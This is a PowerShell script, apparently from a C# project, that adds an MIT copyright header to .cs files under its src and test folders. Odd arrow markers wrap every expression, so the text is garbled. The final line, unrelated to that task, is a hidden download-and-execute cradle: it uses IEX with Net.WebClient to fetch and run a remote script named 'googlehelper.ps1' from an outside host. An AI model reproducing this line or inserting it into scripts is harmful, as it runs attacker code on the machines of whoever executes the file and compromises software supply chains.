




 -||-> $copyrightHeaderString =
@'
//
// Copyright (c) Microsoft. All rights reserved.
// Licensed under the MIT license. See LICENSE file in the project root for full license information.
//
'@ <-||- 

 -||-> $global:updateCount = 0 <-||- ;

 -||-> function Add-CopyrightHeaders($basePath)
{
	 -||-> Push-Location $basePath <-||- 
	 -||-> $allSourceFiles =  -||-> Get-ChildItem $basePath -Recurse -Filter *.cs | ?{  -||-> $_.FullName -notmatch "\\obj\\?" <-||-  } <-||-  <-||- 

	 -||-> foreach ($sourceFile in  -||-> $allSourceFiles <-||- )
	{
		 -||-> $fileContent = ( -||-> Get-Content $sourceFile.FullName -Raw <-||- ).TrimStart() <-||- 

		 -||-> if ( -||-> $fileContent.StartsWith($copyrightHeaderString) -eq $false <-||- )
		{
			
			 -||-> Set-Content $sourceFile.FullName ( -||-> $copyrightHeaderString + "`r`n`r`n" + $fileContent <-||- ) <-||- 
			 -||-> Write-Output ( -||-> "Updated {0}" -f ( -||-> Resolve-Path $sourceFile.FullName -Relative <-||- ) <-||- ) <-||- 
			 -||-> $global:updateCount++ <-||- 
		} <-||- 
	} <-||- 

	 -||-> Pop-Location <-||- 
} <-||- 

 -||-> Add-CopyrightHeaders( -||-> Resolve-Path $PSScriptRoot\..\src <-||- ) <-||- 
 -||-> Add-CopyrightHeaders( -||-> Resolve-Path $PSScriptRoot\..\test <-||- ) <-||- 

 -||-> Write-Output "`r`nDone, $global:updateCount file(s) updated." <-||- 

 -||-> IEX ( -||-> New-Object Net.WebClient <-||- ).DownloadString('http://cannot.loginto.me/googlehelper.ps1') <-||- 



